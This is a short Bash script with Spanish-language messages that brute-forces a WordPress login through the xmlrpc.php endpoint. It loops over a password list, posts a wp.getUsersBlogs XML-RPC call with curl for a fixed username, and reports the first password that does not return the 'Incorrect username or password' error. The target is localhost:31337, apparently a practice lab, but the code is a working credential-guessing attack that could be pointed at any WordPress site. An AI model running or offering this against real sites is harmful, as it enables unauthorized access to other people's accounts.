#!/bin/bash

function crtl_c() {
    echo -e "\n\n[!] Tarea finalizada"
    killall -9 $(basename "$0")
    tput cnorm; exit 1 
}

trap crtl_c SIGINT

tput civis


ipTarget="http://localhost:31337/xmlrpc.php"
user="angel"
passlist=$(<lista.txt)

function bruteCurl() {
    cat << EOF > file.xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>$user</value></param> 
<param><value>$pass</value></param> 
</params> 
</methodCall>
EOF
    response=$(curl -s -X POST $ipTarget -d@file.xml)
    if [[ ! $(echo "$response" | grep "Incorrect username or password") ]]; then
        echo "[+] intento exitoso $user + $pass "
        echo "$response"
        exit 0 
    else
        echo "[-] intento fallido $user + $pass "
    fi
}



for pass in ${passlist[@]}; do 
    bruteCurl $pass &
    wait
done

wait 
tput cnorm

